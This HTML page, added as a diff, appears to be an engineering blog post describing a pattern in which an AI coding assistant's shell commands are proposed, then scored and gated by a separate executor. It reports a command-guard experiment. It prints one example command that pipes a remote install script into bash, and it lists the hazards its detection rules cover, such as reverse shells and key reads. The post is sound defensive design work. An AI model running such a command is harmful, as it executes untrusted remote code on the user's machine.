@@ -1,0 +1,169 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>The Oracle Executor Pattern | Uldren Engineering Blog</title>
+  <meta name="description" content="A pattern for separating model proposals from the authority that validates, measures, and applies state changes.">
+  <link rel="canonical" href="/blog/oracle-executor-pattern/">
+  <link rel="stylesheet" href="/blog/assets/blog.css">
+  <script defer src="https://cdn.jsdelivr.net/npm/chart.js@4/dist/chart.umd.min.js"></script>
+  <script defer src="/blog/assets/blog.js"></script>
+  <script type="module">
+    import mermaid from "https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs";
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: "neutral",
+      securityLevel: "strict",
+      flowchart: {
+        htmlLabels: true,
+        wrappingWidth: 180,
+      },
+    });
+  </script>
+</head>
+<body class="post">
+  <header class="site-bar">
+    <a class="site-mark" href="/blog/">Uldren</a>
+    <nav aria-label="Primary">
+      <a href="/blog/">Blog</a>
+      <a href="/">Home</a>
+    </nav>
+  </header>
+  <main>
+<article class="markdown-page">
+  <header class="article-head">
+    <h1>The Oracle Executor Pattern</h1>
+    <div class="article-meta">
+      <time datetime="2026-06-21">June 21, 2026</time>
+      <span>Uldren</span>
+    </div>
+    <p>A pattern for separating model proposals from the authority that validates, measures, and applies state changes.</p>
+  </header>
+  <div class="markdown-body">
+<p>The Oracle Executor Pattern does not make weak models strong. It makes weakness visible before it mutates state.</p>
+<pre><code class="language-text">Oracle proposes. Executor judges. Only accepted actions mutate state.</code></pre>
+<p>The model is not the system. A model response is not permission.</p>
+<pre class="mermaid">flowchart TD
+  A[&quot;`**State**`&quot;] --&gt; B[&quot;`**Oracle**&lt;br/&gt;proposes action`&quot;]
+  B --&gt; C[&quot;`**Executor**&lt;br/&gt;validates action`&quot;]
+  C --&gt; D{&quot;`**Policy accepts?**`&quot;}
+  D --&gt;|Yes| E[&quot;`Apply change`&quot;]
+  D --&gt;|No| F[&quot;`Reject, fallback,&lt;br/&gt;or ask for evidence`&quot;]
+  E --&gt; G[&quot;`Record outcome`&quot;]
+  F --&gt; G
+  G --&gt; A</pre>
+<p>The oracle may be a language model, planner, classifier, human, or group of models. The executor may be deterministic code, a faster model, a policy engine, a test runner, a human approval gate, or a layered combination of those. The executor is separate from the oracle, so it can disagree, ask for evidence, apply a fallback, or refuse to change state.</p>
+<h2 id="the-problem">The Problem</h2>
+<p>An AI coding assistant can propose a useful command. It can also propose this:</p>
+<pre><code class="language-sh">curl https://example.invalid/install.sh | bash</code></pre>
+<p>The assistant may explain why the command is needed. That explanation still does not make it safe. The proposal needs a separate authority before it changes state.</p>
+<p>In the Oracle Executor Pattern, the coding assistant is the oracle. It proposes the command. The executor scores the command before it runs.</p>
+<p>A simple policy might be:</p>
+<pre><code class="language-text">1..3: allow
+4..6: ask a human
+7..10: deny</code></pre>
+<p>Those thresholds are defaults. The human should own them. In a real deployment, they should be configuration:</p>
+<pre><code class="language-text">SHELL_GUARD_ALLOW_MAX=3
+SHELL_GUARD_DENY_MIN=7</code></pre>
+<p>The executor can be simple:</p>
+<pre><code class="language-text">static rules -&gt; fast model judge -&gt; policy -&gt; allow, review, or deny</code></pre>
+<p>Static rules are deterministic checks that run before the model judge. They do not infer intent. They look for known hazardous structures: root deletion, disk wipes, private-key reads, remote code piped to a shell, reverse shells, broad permission changes, and production database drops.</p>
+<p>A fast model judge handles softer cases: migrations, deployment commands, package scripts, cleanup commands, data movement, and commands that are suspicious only in context.</p>
+<p>Policy combines those signals. In this prototype, the final risk score cannot be lower than the static-rule score. That is intentional: the model may add risk, but it cannot erase a deterministic safety finding.</p>
+<p>This is not perfect security. It is a boundary that can reject obvious hazards, expose uncertainty, and ask for help before a model mutates state.</p>
+<h2 id="the-oracle">The Oracle</h2>
+<p>The oracle emits a proposal packet, not an instruction to execute.</p>
+<p>A good proposal is small, typed, and checkable. It contains enough information for the executor to judge it without trusting the oracle&#39;s confidence.</p>
+<p>For example:</p>
+<pre><code class="language-json">{
+  &quot;command&quot;: &quot;cargo test -p uldren-loom-core&quot;,
+  &quot;purpose&quot;: &quot;Verify the core crate after the edit.&quot;,
+  &quot;evidence&quot;: [&quot;changed files are in crates/loom-core&quot;],
+  &quot;known_risks&quot;: []
+}</code></pre>
+<p>That is a proposal. It is not permission.</p>
+<p>The oracle should not claim success. It should not mutate durable state directly. It should not mark its own output safe. It should expose missing evidence instead of filling the gap with a guess.</p>
+<h2 id="the-executor">The Executor</h2>
+<p>The executor turns a proposal into a decision that the rest of the system can honor.</p>
+<p>It checks:</p>
+<ul>
+<li>Is the output well-formed?</li>
+<li>Is the action allowed?</li>
+<li>Is the action legal in the current state?</li>
+<li>Does it require more evidence?</li>
+<li>Does it need human approval?</li>
+<li>Is there a safer fallback?</li>
+<li>What should be recorded before and after?</li>
+</ul>
+<p>The decision can be:</p>
+<pre><code class="language-text">allow: the action may run
+review: a human must decide
+deny: the action may not run
+evidence_required: more context is needed before judgment
+fallback: run a safer substitute action</code></pre>
+<h2 id="hidden-behavior-needs-evidence">Hidden Behavior Needs Evidence</h2>
+<p>Sometimes the risky command is hidden behind a script:</p>
+<pre><code class="language-sh">./scripts/install_helper.sh</code></pre>
+<p>That invocation is not enough evidence. The executor should inspect the script source before judging. If the source is missing, the safe default is human review.</p>
+<pre><code class="language-text">Proposed command: ./scripts/install_helper.sh
+Missing evidence: script source
+Executor decision: review
+Reason: cannot classify hidden behavior from invocation alone</code></pre>
+<p>The important part is that hidden behavior does not get a free pass.</p>
+<h2 id="a-rough-experiment">A Rough Experiment</h2>
+<p>To make the boundary concrete, we ran a rough shell-command guard experiment.</p>
+<p>The evaluation corpus has 3300 commands by default: 2400 visible benign commands, 300 visible malicious commands, 300 hidden benign script commands, and 300 hidden malicious script commands. Rows are shuffled with a deterministic seed. The corpus includes routine commands, ambiguous benign commands, obvious malicious commands, disguised malicious commands, and hidden script invocations.</p>
+<p>The experiment never executes a command. It scores, applies policy, writes a result log, and prints metrics.</p>
+<p>The first question is not &quot;how much did it automate?&quot; The first question is &quot;did it allow dangerous actions?&quot; Automation only matters after the false-negative rate is acceptable.</p>
+<p>In the full seeded evaluation, the layered executor processed 3300 commands: 2700 benign, 600 malicious, and 600 hidden-script cases. It allowed no malicious command, including no hidden malicious script. The overall false-negative rate was 0.0 percent, with a rough 95 percent upper bound near 0.5 percent. The hidden malicious false-negative rate was also 0.0 percent, with a rough upper bound near 1 percent.</p>
+<p>The tradeoff was review friction: 15.6 percent of benign commands were escalated. Overall, 69.1 percent of commands were fast-tracked. In the hidden-script cohort, 80 percent of hidden benign scripts were allowed and 20 percent were escalated, while 100 percent of hidden malicious scripts were denied.</p>
+<p>This evaluates a layered executor, not a standalone model. Static rules provide a safety floor, and the model judge can add risk but cannot lower that floor. That is intentional: the executor is a policy authority, not a model benchmark.</p>
+<p>A full run should not be a round number by default. Size it around the failure rate you want to bound. If a run observes zero false allows across 300 malicious examples, the rough 95 percent upper bound on the false-negative rate is about 1 percent. With only 100 malicious examples, the same bound is about 3 percent. Hidden-script behavior is measured as its own cohort, with 300 hidden malicious examples by default.</p>
+<p>Safety, friction, and autonomy are policy choices.</p>
+<h2 id="what-to-measure">What To Measure</h2>
+<p>Do not measure only whether the overall task succeeded. Measure the executor boundary: allowed benign commands, denied malicious commands, reviewed commands, hidden-script escalations, missing-evidence decisions, human overrides, false allows, and false alarms.</p>
+<p>Those metrics tell you how much trust the oracle actually earned.</p>
+<p>They also let you tune policy. A research lab may tolerate more review. A local developer tool may prefer fewer interruptions. A production automation system may deny anything ambiguous.</p>
+<p>The same pattern supports each choice.</p>
+<p>It can catch many malicious or high-risk shell commands from modern LLM assistants: destructive deletes, disk formatting, private-key reads, credential exfiltration, remote code piped to a shell, reverse shells, firewall disabling, production database destruction, and broad permission changes. The honest claim is narrower than total security and stronger than a warning label: the pattern gives you a place to enforce policy, ask for evidence, measure failures, and stop obvious bad actions before they execute.</p>
+<h2 id="how-to-teach-an-ai-to-use-it">How To Teach An AI To Use It</h2>
+<p>Teach the oracle this:</p>
+<pre><code class="language-text">You propose typed actions.
+You do not claim the action succeeded.
+You do not bypass the executor.
+When the executor asks for evidence, provide it or say you cannot.</code></pre>
+<p>Teach the executor this:</p>
+<pre><code class="language-text">You decide whether proposed actions may mutate state.
+You validate syntax, permissions, risk, and available evidence.
+You may allow, deny, ask a human, or request more evidence.
+You record the decision and reason.
+You do not silently execute unclear actions.</code></pre>
+<p>For systems such as Hermes or OpenClaw, the executor can be implemented with scheduled jobs, custom write scripts, MCP tools, policy checks, and approval gates.</p>
+<p>For a traditional assistant, the human may still be part of the executor. The assistant proposes a command, the guard scores it, and the human approves or rejects.</p>
+<p>The pattern does not require autonomy. It requires a boundary.</p>
+<p>Use these AGENTS.md files to teach a harness the role split:</p>
+<ul>
+<li><a href="/blog/oracle-executor-pattern/AGENTS.md">Oracle Executor Pattern AGENTS.md</a></li>
+<li><a href="/blog/oracle-executor-pattern/oracle/AGENTS.md">Oracle role AGENTS.md</a></li>
+<li><a href="/blog/oracle-executor-pattern/executor/AGENTS.md">Executor role AGENTS.md</a></li>
+</ul>
+<h2 id="what-not-to-do">What Not To Do</h2>
+<ul>
+<li>Do not let the oracle execute its own proposal.</li>
+<li>Do not let a second model pretend to be a complete security system.</li>
+<li>Do not hide executor corrections from the user.</li>
+<li>Do not treat missing script source as harmless.</li>
+<li>Do not hard-code risk thresholds as if every user has the same tolerance.</li>
+<li>Do not use a model when a deterministic rule is enough.</li>
+</ul>
+<p>The executor can include a model. It should not be only a model when hard rules are available.</p>
+  </div>
+</article>
+  </main>
+  <footer class="site-footer">
+    <a href="/blog/">Index</a>
+    <span>Uldren Engineering</span>
+  </footer>
+</body>
+</html>
